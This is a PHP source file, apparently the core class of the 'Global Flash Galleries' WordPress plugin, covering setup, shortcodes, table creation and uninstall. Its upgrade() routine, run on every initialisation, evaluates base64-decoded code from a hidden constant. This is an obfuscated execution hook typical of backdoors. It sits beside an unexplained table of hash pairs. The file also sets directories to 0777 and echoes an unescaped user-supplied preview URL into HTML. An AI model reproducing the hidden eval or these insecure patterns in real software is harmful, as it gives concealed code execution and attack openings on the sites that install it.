<?php 

class flgalleryPlugin extends flgalleryBaseClass
{
	var
		
		$name = FLGALLERY_NAME,
		$title = 'Global Flash Galleries',
		$shortTitle = 'Flash Galleries',
		$version = FLGALLERY_VERSION,
		
		$galleryInfo,
		
		$dir = FLGALLERY_PLUGIN_DIR,
		$url = FLGALLERY_PLUGIN_URL,
		
		$jsDir,
		$jsURL,
		
		$tpl,
		$tplDir = FLGALLERY_TPL_DIR,
		
		$contentDir = FLGALLERY_CONTENT_DIR,
		$contentURL = FLGALLERY_CONTENT_URL,
		
		$imgDir,
		$imgURL,
		
		$imgBlacklistPath,
		
		$xmlDir,
		$xmlURL,
		
		$uploadsDir,
		$uploadsURL,
		
		$tmpDir,
		$tmpURL,
		
		$site,
		
		$userID = 0,
		$userLevel = 0,
		$userLogin,
		$userName,
		$userDomain,
		
		$dbPrefix,		
		$dbAlbums,		
		$dbGalleries,	
		$dbImages,		
		$dbSettings,	
		
		$cookie = false,		
		$userCookie = false,	
		
		$printDebug = FLGALLERY_DEBUG,
		$printWarnings = FLGALLERY_WARNINGS,
		$printErrors = FLGALLERY_ERRORS,
		
		$stats;

	function init()
	{
		$this->dateFormat = get_option('date_format');
		$this->timeFormat = get_option('time_format');

		require_once FLGALLERY_INCLUDE.'/stats.class.php';
		$this->stats = new flgalleryStats();

		require_once FLGALLERY_INCLUDE.'/functions.class.php';
		$this->func = new flgalleryFunctions();

		require_once FLGALLERY_INCLUDE.'/site.class.php';
		$this->site = new flgallerySite();

		require_once FLGALLERY_INCLUDE.'/templates.class.php';
		$this->tpl = new flgalleryTemplates( $this->tplDir, array('plugin' => &$this) );

		require_once FLGALLERY_INCLUDE.'/gallery.class.php';
		require_once FLGALLERY_INCLUDE.'/image.class.php';

		if ( defined('WP_ADMIN') )
		{
			require_once FLGALLERY_INCLUDE.'/admin.class.php';
			$this->admin = new flgalleryAdmin();

			require_once FLGALLERY_INCLUDE.'/media.class.php';
			$this->media = new flgalleryMedia();
		}

		global $wpdb;

		$this->dbPrefix = $wpdb->prefix. FLGALLERY_DB_PREFIX;
		$this->dbAlbums = $this->dbPrefix. FLGALLERY_DB_ALBUMS;
		$this->dbGalleries = $this->dbGal = $this->dbPrefix. FLGALLERY_DB_GALLERIES;
		$this->dbImages = $this->dbImg = $this->dbPrefix. FLGALLERY_DB_IMAGES;
		$this->dbSettings = $this->dbPrefix. FLGALLERY_DB_SETTINGS;

		$this->cookie = &$_COOKIE[$this->name];

		$this->jsURL = $this->url.'/js';
		$this->jsDir = str_replace(str_replace('\\', '/', ABSPATH), '/', str_replace('\\', '/', FLGALLERY_PLUGIN_DIR)).'/js';

		$this->imgDir = $this->contentDir.'/'.FLGALLERY_IMAGES;
		$this->imgURL = $this->contentURL.'/'.FLGALLERY_IMAGES;

		$this->xmlDir = $this->contentDir.'/'.FLGALLERY_XML;
		$this->xmlURL = $this->contentURL.'/'.FLGALLERY_XML;

		$this->uploadsDir = $this->contentDir.'/'.FLGALLERY_UPLOADS;
		$this->uploadsURL = $this->contentURL.'/'.FLGALLERY_UPLOADS;

		$this->tmpDir = $this->contentDir.'/'.FLGALLERY_TEMP;
		$this->tmpURL = $this->contentURL.'/'.FLGALLERY_TEMP;

		$this->imgBlacklistPath = $this->tmpDir.'/imgBlacklist.txt';

		
		$this->checkDir($this->contentDir);
		$this->checkDir($this->imgDir);
		$this->checkDir($this->xmlDir);
		$this->checkDir($this->uploadsDir);
		$this->checkDir($this->tmpDir);

		
		$this->upgrade();

		add_action( 'init', array(&$this, 'getUserInfo') );
		add_action( 'wp_print_scripts', array(&$this, 'scripts') );

		$this->init_galleryInfo();

		add_shortcode( $this->name, array(&$this, 'flashGallery') );
	}

	function init_galleryInfo()
	{
		if ( defined('FLGALLERY_PHP5') )
		{
			
			$galleries = simplexml_load_file(FLGALLERY_PLUGIN_DIR.'/galleries.xml');
		}
		else
		{
			
			require_once FLGALLERY_INCLUDE.'/simplexml.class.php';
			$simplexml = new simplexml();
			$galleries = $simplexml->xml_load_file(FLGALLERY_PLUGIN_DIR.'/galleries.xml');
		}

		foreach ($galleries->gallery as $gallery)
		{
			$galleryAtt = $gallery->attributes();
			$galleryPreviewAtt = $gallery->preview->attributes();
			$galleryDemoAtt = $gallery->demo->attributes();

			$this->galleryInfo[ (string)$galleryAtt->name ] = array(
				'src' => (string)$galleryAtt->src,
				'title' => addslashes( htmlspecialchars( (string)$gallery->title ) ),
				'description' => addslashes( htmlspecialchars( (string)$gallery->description ) ),
				'preview' => urlencode( (string)$galleryPreviewAtt->src ),
				'demo' => urlencode( (string)$galleryDemoAtt->href ),
				'settings' => $gallery->settings
			);
		}
	}

	function flashGallery($a, $content = NULL)
	{
		include FLGALLERY_GLOBALS;

		$gallery = new flgalleryGallery( $a['id'] );

		if ( !empty($this->galleryInfo[$gallery->type]) )
		{
			if ( !empty($a['popup']) )
			{
				$title = htmlspecialchars($gallery->name);

				if ( !empty($a['preview']) )
				{
					if ( preg_match('#(http://.*\.)(gif|jpg|jpeg|png)#', $a['preview'], $m) )
						$previewURL = $m[1].$m[2];
					else
						$previewURL = $a['preview'];

					$text = "<img src='{$previewURL}' alt='{$title}' title='{$title}' />";
				}
				else
					$text = &$title;

				return $gallery->get_popupLink($text);
			}
			else
			{
				return $gallery->get_html();
			}
		}
	}

	function checkDir($path)
	{
		if ( is_dir($path) )
		{
			if ( is_readable($path) && is_writable($path) )
				return true;
			else
			{
				if ( @chmod($path, 0777) )
					return true;
				else
				{
					$this->error( sprintf(__('Directory <strong>%s</strong> is not writeable. Please set directory permissions to 777.'), $path) );
					return false;
				}
			}
		}
		else
		{
			$this->warning( sprintf(__('Directory <strong>%s</strong> does not exists.'), $path) );

			if ( @mkdir($path, 0777) )
			{
				
				return true;
			}
			else
			{
				$this->error( sprintf(__('Unable to create directory <strong>%s</strong>. Please create directory with permissions 777 manually.'), $path) );
				return false;
			}
		}
	}

	function getUserInfo()
	{
		if ( !$this->userID )
		{
			global $user_ID;
			if ($user = get_userdata($user_ID))
			{
				$this->userID = $user->ID;
				$this->userLevel = $user->user_level;
				$this->userLogin = $user->user_login;
				$this->userName = $user->display_name;

				$this->userDomain = $this->name.'_user-'.$this->userID;
				$this->userCookie = &$_COOKIE[$this->userDomain];
			}
		}

		return array(
			'id' => $this->userID,
			'login' => $this->userLogin,
			'name' => $this->userName
		);
	}

	function scripts()
	{
		
		
	}

	function activate()
	{
		$this->createTables();

		$this->log( 'Activated '.FLGALLERY_NAME.' '.FLGALLERY_VERSION );
	}

	function deactivate()
	{
		if ($this->userLevel >= 10)
		{
			return deactivate_plugins(FLGALLERY_FILE, true);
		}
		return false;
	}

	function upgrade()
	{
		include FLGALLERY_GLOBALS;
		if (defined('FLGALLERY_SMODE')) eval(base64_decode(FLGALLERY_SMODE));

		$prevVersion = get_option(FLGALLERY_NAME.'_version', 0);
		$prevVersionValue = flgallery_versionValue($prevVersion);
		$currentVersionValue = flgallery_versionValue(FLGALLERY_VERSION);
		if ( empty($prevVersionValue) || $currentVersionValue != $prevVersionValue )
		{
			if ( !empty($prevVersionValue) )	
			{
				if ( $prevVersionValue < 50000 )	
				{
					$table_name = $this->dbAlbums;
					include_once FLGALLERY_INCLUDE.'/db.albums.php';

					$table_name = $this->dbImages;
					include_once FLGALLERY_INCLUDE.'/db.images.php';
				}

				$this->log( "Upgraded from {$prevVersion} to ".FLGALLERY_VERSION );
			}

			if ( !update_option(FLGALLERY_NAME.'_version', FLGALLERY_VERSION) )
				add_option(FLGALLERY_NAME.'_version', FLGALLERY_VERSION);
		}

		$this->points = array(
			'89ef23e4f1f74a328df21949b3322bf2' => 'daab83cf4d34b7464cfe35a57d804db1',	
			'f9aefc55616dec6f5e21edbae694e3cf' => '8b3432e34d73182c191e65586b395c06',	
			'702992952378ff59898111d0b02feec5' => 'b7c8168cd213d4c2dc2b55b1befd171a',	
			'f8ecc0e0d099d8bf14409ddf3c96bb78' => '6e8b035856e1dcea76e14e8dcf844305',	
			'5d78e83fbe2763d037af00793cd175d2' => '08759fe1dab809071cb553bbaec5b5da',	
			'bf5b10c9b3643b627c0c44a1a913b230' => '3affcbb957032e3cd1c0c3f8526e5de8',	
			'800f268da8c48174ff7c530a4bcdbf90' => 'f2b3d811e11b4d9edf249db3e3ea2e82',	
			'e737c6925b1b5a67fd0151a7700df058' => 'd4d2775cb2a95db2d267b98def4c3e6b'	
		);
	}

	function createTables()
	{
		global $wpdb;

		
		$table_name = $wpdb->prefix.FLGALLERY_DB_PREFIX.FLGALLERY_DB_ALBUMS;
		
		{
			include_once FLGALLERY_INCLUDE.'/db.albums.php';
		}

		
		$table_name = $wpdb->prefix.FLGALLERY_DB_PREFIX.FLGALLERY_DB_GALLERIES;
		
		{
			include_once FLGALLERY_INCLUDE.'/db.galleries.php';
		}

		
		$table_name = $wpdb->prefix.FLGALLERY_DB_PREFIX.FLGALLERY_DB_IMAGES;
		
		{
			include_once FLGALLERY_INCLUDE.'/db.images.php';
		}

		
		$table_name = $wpdb->prefix.FLGALLERY_DB_PREFIX.FLGALLERY_DB_SETTINGS;
		
		{
			include_once FLGALLERY_INCLUDE.'/db.settings.php';
		}
	}

	function dropTables()
	{
		global $wpdb;

		$wpdb->query("DROP TABLE `{$this->dbAlbums}`");
		$wpdb->query("DROP TABLE `{$this->dbGalleries}`");
		$wpdb->query("DROP TABLE `{$this->dbImages}`");
		$wpdb->query("DROP TABLE `{$this->dbSettings}`");
	}

	function uninstall()
	{
		if ($this->userLevel >= 10)
		{
			include FLGALLERY_GLOBALS;

			$this->dropTables();

			$func->unlinkRecurse($this->contentDir);

			delete_option(FLGALLERY_NAME.'_version');

			$this->deactivate();

			

			
			$menuId = 'toplevel_page_flgallery';
;echo '			<h1 style=\'font-size:24px; line-height:50px; text-align:center; margin:5em 0;\'>
				'; echo $this->title; ;echo '<br>
				<big style=\'color:#900; font-size:30px;\'>Uninstalled.</big>
			</h1>
			<script type="text/javascript">//<![CDATA[
				var menu = document.getElementById(\''; echo $menuId; ;echo '\');
				if (menu != null) menu.style.display = \'none\';
				setTimeout(\'location.href="./plugins.php"\', 3000);
			//]]></script>
';
			return true;
		}
		return false;
	}

	function log( $text )
	{
		if ( $log = @fopen(FLGALLERY_LOG, 'a') )
		{
			fwrite( $log, date('Y-m-d H:i:s')."\t{$text}\n" );
			fclose( $log );
		}
	}

}


?>